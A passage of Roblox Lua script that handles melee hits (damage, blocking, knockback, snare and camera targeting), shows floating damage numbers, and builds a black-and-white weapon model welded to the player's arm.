        if hit.Parent:findFirstChild("DebounceHit")~=nil then if hit.Parent.DebounceHit.Value==true then return end end
        --[[                if game.Players:GetPlayerFromCharacter(hit.Parent)~=nil then
                        return
                end]]
--                        hs(hit,1.2) 
                        c=Instance.new("ObjectValue")
                        c.Name="creator"
                        c.Value=game:service("Players").LocalPlayer
                        c.Parent=h
                        game:GetService("Debris"):AddItem(c,.5)
                Damage=math.random(minim,maxim)
--                h:TakeDamage(Damage)
                blocked=false
                block=hit.Parent:findFirstChild("Block")
                if block~=nil then
                print(block.className)
                if block.className=="NumberValue" then
                if block.Value>0 then
                blocked=true
                if decreaseblock==nil then
                block.Value=block.Value-1
                end
                end
                end
                if block.className=="IntValue" then
                if block.Value>0 then
                blocked=true
                if decreaseblock~=nil then
                block.Value=block.Value-1
                end
                end
                end
                end
                if blocked==false then
--                h:TakeDamage(Damage)
                h.Health=h.Health-Damage
                showDamage(hit.Parent,Damage,.5,BrickColor.new("Dark stone grey"))
                else
                h.Health=h.Health-(Damage/2)
                showDamage(hit.Parent,Damage/2,.5,BrickColor.new("Bright blue"))
                end
                if Type=="Knockdown" then
                hum=hit.Parent.Humanoid
hum.PlatformStand=true
coroutine.resume(coroutine.create(function(HHumanoid)
swait(1)
HHumanoid.PlatformStand=false
end),hum)
                local angle=(hit.Position-(Property.Position+Vector3.new(0,0,0))).unit
--hit.CFrame=CFrame.new(hit.Position,Vector3.new(angle.x,hit.Position.y,angle.z))*CFrame.fromEulerAnglesXYZ(math.pi/4,0,0)
local bodvol=Instance.new("BodyVelocity")
bodvol.velocity=angle*knockback
bodvol.P=5000
bodvol.maxForce=Vector3.new(8e+003, 8e+003, 8e+003)
bodvol.Parent=hit
rl=Instance.new("BodyAngularVelocity")
rl.P=3000
rl.maxTorque=Vector3.new(500000,500000,500000)*50000000000000
rl.angularvelocity=Vector3.new(math.random(-10,10),math.random(-10,10),math.random(-10,10))
rl.Parent=hit
game:GetService("Debris"):AddItem(bodvol,.5)
game:GetService("Debris"):AddItem(rl,.5)
                elseif Type=="Normal" then
                vp=Instance.new("BodyVelocity")
                vp.P=500
                vp.maxForce=Vector3.new(math.huge,0,math.huge)
--                vp.velocity=Character.Torso.CFrame.lookVector*Knockback
                if KnockbackType==1 then
                vp.velocity=Property.CFrame.lookVector*knockback+Property.Velocity/1.05
                elseif KnockbackType==2 then
                vp.velocity=Property.CFrame.lookVector*knockback
                end
                if knockback>0 then
                        vp.Parent=hit.Parent.Torso
                end
                game:GetService("Debris"):AddItem(vp,.5)
                elseif Type=="Up" then
                local bodyVelocity=Instance.new("BodyVelocity")
                bodyVelocity.velocity=vt(0,60,0)
                bodyVelocity.P=5000
                bodyVelocity.maxForce=Vector3.new(8e+003, 8e+003, 8e+003)
                bodyVelocity.Parent=hit
                game:GetService("Debris"):AddItem(bodyVelocity,1)
                rl=Instance.new("BodyAngularVelocity")
                rl.P=3000
                rl.maxTorque=Vector3.new(500000,500000,500000)*50000000000000
                rl.angularvelocity=Vector3.new(math.random(-30,30),math.random(-30,30),math.random(-30,30))
                rl.Parent=hit
                game:GetService("Debris"):AddItem(rl,.5)
                elseif Type=="Snare" then
                bp=Instance.new("BodyPosition")
                bp.P=2000
                bp.D=100
                bp.maxForce=Vector3.new(math.huge,math.huge,math.huge)
                bp.position=hit.Parent.Torso.Position
                bp.Parent=hit.Parent.Torso
                game:GetService("Debris"):AddItem(bp,1)
                elseif Type=="Target" then
                if Targetting==false then
                ZTarget=hit.Parent.Torso
                coroutine.resume(coroutine.create(function(Part) 
                so("http://www.roblox.com/asset/?id=15666462",Part,1,1.5) 
                swait(5)
                so("http://www.roblox.com/asset/?id=15666462",Part,1,1.5) 
                end),ZTarget)
                TargHum=ZTarget.Parent:findFirstChild("Humanoid")
                targetgui=Instance.new("BillboardGui")
                targetgui.Parent=ZTarget
                targetgui.Size=UDim2.new(10,100,10,100)
                targ=Instance.new("ImageLabel")
                targ.Parent=targetgui
                targ.BackgroundTransparency=1
                targ.Image="rbxassetid://4834067"
                targ.Size=UDim2.new(1,0,1,0)
                cam.CameraType="Scriptable"
                cam.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)
                dir=Vector3.new(cam.CoordinateFrame.lookVector.x,0,cam.CoordinateFrame.lookVector.z)
                workspace.CurrentCamera.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)
                Targetting=true
                RocketTarget=ZTarget
                for i=1,Property do
                --while Targetting==true and Humanoid.Health>0 and Character.Parent~=nil do
                if Humanoid.Health>0 and Character.Parent~=nil and TargHum.Health>0 and TargHum.Parent~=nil and Targetting==true then
                swait()
                end
                --workspace.CurrentCamera.CoordinateFrame=CFrame.new(Head.CFrame.p,Head.CFrame.p+rmdir*100)
                cam.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)
                dir=Vector3.new(cam.CoordinateFrame.lookVector.x,0,cam.CoordinateFrame.lookVector.z)
                cam.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)*cf(0,5,10)*euler(-0.3,0,0)
                end
                Targetting=false
                RocketTarget=nil
                targetgui.Parent=nil
                cam.CameraType="Custom"
                end
                end
                        debounce=Instance.new("BoolValue")
                        debounce.Name="DebounceHit"
                        debounce.Parent=hit.Parent
                        debounce.Value=true
                        game:GetService("Debris"):AddItem(debounce,Delay)
                        c=Instance.new("ObjectValue")
                        c.Name="creator"
                        c.Value=Player
                        c.Parent=h
                        game:GetService("Debris"):AddItem(c,.5)
                CRIT=false
                hitDeb=true
                AttackPos=6
        end
end
 
showDamage=function(Char,Dealt,du,Color)
        m=Instance.new("Model")
        m.Name=tostring(Dealt)
        h=Instance.new("Humanoid")
        h.Health=0
        h.MaxHealth=0
        h.Parent=m
        c=Instance.new("Part")
        c.Transparency=0
        c.BrickColor=Color
        c.Name="Head"
        c.TopSurface=0
        c.BottomSurface=0
        c.formFactor="Plate"
        c.Size=Vector3.new(1,.4,1)
        ms=Instance.new("CylinderMesh")
        ms.Scale=Vector3.new(.8,.8,.8)
        if CRIT==true then
                ms.Scale=Vector3.new(1,1.25,1)
        end
        ms.Parent=c
        c.Reflectance=0
        Instance.new("BodyGyro").Parent=c
        c.Parent=m
        if Char:findFirstChild("Head")~=nil then
        c.CFrame=CFrame.new(Char["Head"].CFrame.p+Vector3.new(0,1.5,0))
        elseif Char.Parent:findFirstChild("Head")~=nil then
        c.CFrame=CFrame.new(Char.Parent["Head"].CFrame.p+Vector3.new(0,1.5,0))
        end
        f=Instance.new("BodyPosition")
        f.P=2000
        f.D=100
        f.maxForce=Vector3.new(math.huge,math.huge,math.huge)
        f.position=c.Position+Vector3.new(0,3,0)
        f.Parent=c
        game:GetService("Debris"):AddItem(m,.5+du)
        c.CanCollide=false
        m.Parent=workspace
        c.CanCollide=false
end
 

Player=game:GetService('Players').LocalPlayer
Character=Player.Character
Mouse=Player:GetMouse()
m=Instance.new('Model',Character)
it=Instance.new
function nooutline(part)
	part.TopSurface,part.BottomSurface,part.LeftSurface,part.RightSurface,part.FrontSurface,part.BackSurface = 10,10,10,10,10,10
end
function part(formfactor,parent,material,reflectance,transparency,brickcolor,name,size)
	local fp=it("Part")
	fp.formFactor=formfactor
	fp.Parent=parent
	fp.Reflectance=reflectance
	fp.Transparency=transparency
	fp.CanCollide=false
	fp.Locked=true
	fp.BrickColor=BrickColor.new(tostring(brickcolor))
	fp.Name=name
	fp.Size=size
	fp.Position=Character.Torso.Position
	nooutline(fp)
	fp.Material=material
	fp:BreakJoints()
	return fp
end
function mesh(Mesh,part,meshtype,meshid,offset,scale)
	local mesh=it(Mesh)
	mesh.Parent=part
	if Mesh=="SpecialMesh" then
		mesh.MeshType=meshtype
		mesh.MeshId=meshid
	end
	mesh.Offset=offset
	mesh.Scale=scale
	return mesh
end
function weld(parent,part0,part1,c0,c1)
	local weld=it("Weld")
	weld.Parent=parent
	weld.Part0=part0
	weld.Part1=part1
	weld.C0=c0
	weld.C1=c1
	return weld
end

Player=game:GetService('Players').LocalPlayer
Character=Player.Character
Mouse=Player:GetMouse()
m=Instance.new('Model',Character)
it=Instance.new
function nooutline(part)
	part.TopSurface,part.BottomSurface,part.LeftSurface,part.RightSurface,part.FrontSurface,part.BackSurface = 10,10,10,10,10,10
end
function part(formfactor,parent,material,reflectance,transparency,brickcolor,name,size)
	local fp=it("Part")
	fp.formFactor=formfactor
	fp.Parent=parent
	fp.Reflectance=reflectance
	fp.Transparency=transparency
	fp.CanCollide=false
	fp.Locked=true
	fp.BrickColor=BrickColor.new(tostring(brickcolor))
	fp.Name=name
	fp.Size=size
	fp.Position=Character.Torso.Position
	nooutline(fp)
	fp.Material=material
	fp:BreakJoints()
	return fp
end
function mesh(Mesh,part,meshtype,meshid,offset,scale)
	local mesh=it(Mesh)
	mesh.Parent=part
	if Mesh=="SpecialMesh" then
		mesh.MeshType=meshtype
		mesh.MeshId=meshid
	end
	mesh.Offset=offset
	mesh.Scale=scale
	return mesh
end
function weld(parent,part0,part1,c0,c1)
	local weld=it("Weld")
	weld.Parent=parent
	weld.Part0=part0
	weld.Part1=part1
	weld.C0=c0
	weld.C1=c1
	return weld
end

HandleA=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","HandleA",Vector3.new(1.6487186, 1.9784621, 1.64871848))
HandleAweld=weld(m,Character["Right Arm"],HandleA,CFrame.new(0, 0, 0, 1, 0, 0, 0, 0.999994874, 0, 0, 0, 1),CFrame.new(-0.0212783813, -0.19931078, 1.02361298, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069))
mesh("CylinderMesh",HandleA,"","",Vector3.new(0, 0, 0),Vector3.new(0.174999908, 1.04999995, 0.524999976))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 1.64871836, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(0, 1.26446486, 0.783137321, -1, -8.61177796e-012, 1.51011747e-007, 1.50979517e-007, -1.33582034e-012, 1, 8.83393966e-012, 1, -1.33582034e-012))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0666666552, 0.0333333202, 0.13333331))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 1.64871836, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(0.00329208374, -1.32052565, 0.784784317, 1, 8.61367228e-012, -1.59730007e-011, 1.62856395e-011, 1.33582034e-012, -1, 8.83393966e-012, 1, -1.33582034e-012))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0666666552, 0.0333333202, 0.13333331))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 1.64871836, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(0, -1.33371496, 0.811164856, 1, 8.61367228e-012, -1.5944579e-011, 1.62714286e-011, 1.33582034e-012, -1, 8.83393966e-012, 1, -1.33582034e-012))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0499999858, 0.0499999858, 0.166666642))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 1.64871836, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(0, 1.25127745, 0.811161995, -1, -8.61177796e-012, 1.51011747e-007, 1.50979517e-007, -1.33582034e-012, 1, 8.83393966e-012, 1, -1.33582034e-012))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0499999784, 0.0499999858, 0.166666642))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-0.96608448, 0.0280532837, -1.49057865, 4.62648231e-009, -0.965925753, -0.258818984, -1, -4.2230571e-008, 1.39698415e-007, -1.45832743e-007, 0.258818984, -0.965925753))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0999999866, 0.0499999858, 0.166666672))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(1.42736959, -1.90734863e-006, -0.270785332, 1.65861607e-007, 0.587785304, 0.809016943, 1, -2.56842885e-008, -1.86375004e-007, -8.87363996e-008, 0.809016943, -0.587785304))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0999999866, 0.166666672, 0.166666672))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-0.577048302, -0.0280227661, -1.4557147, 4.37025598e-008, -1, 5.96059806e-008, -1, -4.37200036e-008, 1.51011761e-007, -1.50979531e-007, -5.9603309e-008, -1))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0999999866, 0.0499999858, 0.166666672))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-0.577048302, 0.0280532837, -1.4557147, 4.37025598e-008, -1, 5.96059806e-008, -1, -4.37200036e-008, 1.51011761e-007, -1.50979531e-007, -5.9603309e-008, -1))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0999999866, 0.0499999858, 0.166666672))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-0.962899685, 0, -1.49143219, 4.62648231e-009, -0.965925753, -0.258818984, -1, -4.2230571e-008, 1.39698415e-007, -1.45832743e-007, 0.258818984, -0.965925753))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.116666652, 0.0499999858, 0.166666672))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(1.43294263, -0.028055191, -0.268722534, 1.65861607e-007, 0.587785304, 0.809016943, 1, -2.56842885e-008, -1.86375004e-007, -8.87363996e-008, 0.809016943, -0.587785304))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0666666552, 0.166666672, 0.149999991))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(1.43294263, 0.0280208588, -0.268722534, 1.65861607e-007, 0.587785304, 0.809016943, 1, -2.56842885e-008, -1.86375004e-007, -8.87363996e-008, 0.809016943, -0.587785304))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0666666552, 0.166666672, 0.149999991))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-0.962899685, -0.0280227661, -1.49143219, 4.62648231e-009, -0.965925753, -0.258818984, -1, -4.2230571e-008, 1.39698415e-007, -1.45832743e-007, 0.258818984, -0.965925753))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0999999866, 0.0499999858, 0.166666672))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-0.577048302, 0, -1.4557147, 4.37025598e-008, -1, 5.96059806e-008, -1, -4.37200036e-008, 1.51011761e-007, -1.50979531e-007, -5.9603309e-008, -1))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.116666652, 0.0499999858, 0.166666672))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-0.3308568, -0.0280208588, -2.34424305, 3.05438661e-008, -0.99619472, -0.0871556401, -1, -4.35536585e-008, 1.47202044e-007, -1.50404261e-007, 0.0871556401, -0.99619472))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0999999866, 0.0499999858, 0.5))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 0.659487367, 4.94615555))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-0.00164794922, 7.62939453e-006, -5.16695738, 4.37025598e-008, -1, 5.96059806e-008, -1, -4.37200036e-008, 1.51011761e-007, -1.50979531e-007, -5.9603309e-008, -1))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.233333305, 0.0499999933, 1))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(1.26282072, -1.90734863e-006, 0.412180901, 1.94690912e-007, -1.32871492e-012, 1, 1, 8.62338326e-012, -1.94723142e-007, 8.83393966e-012, 1, -1.33582034e-012))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.116666652, 0.166666672, 0.333333343))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 1.64871836, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-7.62939453e-006, -0.08244133, 7.9681406, 1, -1.50987148e-007, -1.51011761e-007, 1.51004627e-007, 0.99999994, 1.19207968e-007, 1.50979517e-007, -1.19210625e-007, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0166666452, 0.133333281, 0.433333308))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 1.64871836, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(0.0247306824, -0.0296740532, 2.22566557, 1, -1.50987148e-007, -1.51011761e-007, 1.51004627e-007, 0.99999994, 1.19207968e-007, 1.50979517e-007, -1.19210625e-007, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0666666478, 0.0499999858, 0.400000006))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-1.63556767, 0, -1.01302338, -6.30534984e-008, -0.707106829, -0.70710665, -1, -3.0917235e-008, 1.20103138e-007, -1.06752402e-007, 0.70710665, -0.707106829))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.116666652, 0.0499999858, 0.166666672))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-0.89365387, -0.0280227661, -1.84453678, 4.62648941e-009, -0.965925753, -0.258818984, -1, -4.2230571e-008, 1.39698415e-007, -1.45832772e-007, 0.258818984, -0.965925753))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0999999866, 0.0499999858, 0.0999999866))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 1.64871836, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-0.0280208588, -0.067609787, -2.28172255, -1, -8.61177796e-012, 1.51011747e-007, 8.83204621e-012, 1, -5.96059806e-008, -1.50979531e-007, -5.9603309e-008, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0666666478, 0.0499999858, 0.400000006))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-0.344002247, 1.90734863e-006, -2.34309292, 3.0543859e-008, -0.99619472, -0.0871556699, -1, -4.35536585e-008, 1.47202044e-007, -1.50404247e-007, 0.0871556699, -0.99619472))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.116666652, 0.0499999858, 0.5))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-1.85855484, -0.0280227661, 0.747494459, -8.70362982e-008, 0.5, -0.866025448, -1, 2.1847077e-008, 1.13156574e-007, 7.54974323e-008, 0.866025329, 0.5))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0833333209, 0.0499999858, 0.0999999866))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(0.00164794922, -1.90734863e-006, -2.33613157, 4.37202203e-008, 1, -5.96059806e-008, 1, -4.37027694e-008, -1.51011719e-007, -1.50979531e-007, -5.9603309e-008, -1))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0666666552, 0.166666672, 0.333333343))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-1.64256334, -0.0280227661, -1.02001858, -6.30534984e-008, -0.707106829, -0.70710665, -1, -3.0917235e-008, 1.20103138e-007, -1.06752402e-007, 0.70710665, -0.707106829))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0999999866, 0.0499999858, 0.166666672))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-1.92918491, 0, -0.610360622, -9.31263031e-008, -0.42261833, -0.906307817, -1, -1.84818436e-008, 1.11395778e-007, -6.37986943e-008, 0.906307817, -0.42261833))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.116666652, 0.0499999858, 0.166666672))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-0.893769741, 0, -1.85133171, 4.62648231e-009, -0.965925753, -0.258818984, -1, -4.2230571e-008, 1.39698415e-007, -1.45832772e-007, 0.258818984, -0.965925753))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.116666652, 0.0499999858, 0.116666652))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 1.64871836, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-1.90734863e-006, -0.0412211418, 2.25204802, 1, -1.50987148e-007, -1.51011761e-007, 1.51004627e-007, 0.99999994, 1.19207968e-007, 1.50979517e-007, -1.19210625e-007, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0666666478, 0.0666666552, 0.433333367))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-1.92918491, 0.0280532837, -0.610360622, -9.31263031e-008, -0.42261833, -0.906307817, -1, -1.84818436e-008, 1.11395778e-007, -6.37986943e-008, 0.906307817, -0.42261833))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0999999866, 0.0499999858, 0.166666672))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 1.64871836, 1.64871848))
